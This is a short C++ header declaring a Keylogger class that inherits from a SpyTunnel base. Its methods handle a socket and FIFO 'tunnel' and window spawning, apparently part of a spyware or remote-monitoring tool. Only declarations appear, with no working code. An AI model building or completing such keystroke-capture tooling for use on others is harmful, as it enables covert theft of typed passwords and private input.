#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include "spy_tunnel.hpp"

class Keylogger : public SpyTunnel {
protected:
    void spawn_window() override;
    void handle_tunnel(int __socket, int __fifo_fd) override;
    const char* get_fifo_path();
};

#endif // KEYLOGGER_HPP